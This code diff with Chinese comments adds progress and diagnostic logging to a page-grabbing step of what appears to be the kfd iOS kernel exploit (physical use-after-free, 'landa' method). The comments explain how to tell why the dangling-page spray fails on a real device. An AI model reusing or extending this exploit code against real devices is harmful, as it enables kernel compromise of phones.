@@ -140,6 +140,24 @@ int krkw_helper_grab_free_pages(struct kfd* kfd)
     const u64 grabbed_puaf_pages_goal = (kfd->puaf.number_of_puaf_pages / 4);
     const u64 grabbed_free_pages_max = 400000;
 
+    /*
+     * [MF PATCH 10] 进度日志
+     *
+     * 这个函数是 kopen 失败的头号嫌疑点（真机日志：
+     *   "assertion failed: (landa retry limit reached)"）。
+     * krkw_run 只有这一处能返回 -1。
+     *
+     * 它在数「number_of_puaf_pages 个悬空页里，还剩多少个仍持有哨兵」
+     * —— 仍是哨兵 = 这页还没被系统回收利用。
+     * 目标 = 页数/4；凑不够就放弃。
+     *
+     * 我们需要知道【差多少】才能判断是「内存压力」还是「PUAF 根本没建起来」：
+     *   - 差一点（比如 480/512）→ 内存压力，降低页数或重试就行
+     *   - 差很多（比如 3/512）  → landa 根本没喷出悬空页，问题在更底层
+     */
+    u64 mf_best = 0;
+    u64 mf_iterations = 0;
+
     for (u64 grabbed_free_pages = copy_pages; grabbed_free_pages < grabbed_free_pages_max; grabbed_free_pages += copy_pages) {
         assert_mach(vm_copy(mach_task_self(), kfd->info.copy.src_uaddr, kfd->info.copy.size, kfd->info.copy.dst_uaddr));
 
@@ -149,12 +167,41 @@ int krkw_helper_grab_free_pages(struct kfd* kfd)
             if (!memcmp(info_copy_sentinel, (void*)(puaf_page_uaddr), info_copy_sentinel_size)) {
                 if (++grabbed_puaf_pages == grabbed_puaf_pages_goal) {
                     print_u64(grabbed_free_pages);
+                    if (mf_iterations > 0) {
+                        printf("[mf] 悬空页达标：%llu/%llu（第 %llu 轮）\n",
+                               (unsigned long long)grabbed_puaf_pages,
+                               (unsigned long long)grabbed_puaf_pages_goal,
+                               (unsigned long long)mf_iterations);
+                        fflush(stdout);
+                    }
                     timer_end();
                     return 0;
                 }
             }
         }
+        if (grabbed_puaf_pages > mf_best) mf_best = grabbed_puaf_pages;
+        mf_iterations++;
+
+        /* 每 5000 轮报一次进度，免得刷屏；也避免在长循环里毫无输出 */
+        if (mf_iterations % 5000 == 0) {
+            printf("[mf] grab_free_pages 进行中：轮 %llu，本轮 %llu/%llu，历史最好 %llu/%llu\n",
+                   (unsigned long long)mf_iterations,
+                   (unsigned long long)grabbed_puaf_pages,
+                   (unsigned long long)grabbed_puaf_pages_goal,
+                   (unsigned long long)mf_best,
+                   (unsigned long long)grabbed_puaf_pages_goal);
+            fflush(stdout);
+        }
     }
+
+    /* ★ 关键诊断：把「差多少」打出来 */
+    printf("[mf] ✗ grab_free_pages 未达标：历史最好 %llu/%llu，跑了 %llu 轮\n",
+           (unsigned long long)mf_best,
+           (unsigned long long)grabbed_puaf_pages_goal,
+           (unsigned long long)mf_iterations);
+    printf("[mf]   判读：若历史最好接近目标 → 内存压力，降低 PUAF 页数或重试；\n"
+           "[mf]         若几乎为 0       → landa 没喷出悬空页，问题在更底层\n");
+    fflush(stdout);
 
     print_warning("failed to grab free pages goal");
     return -1;
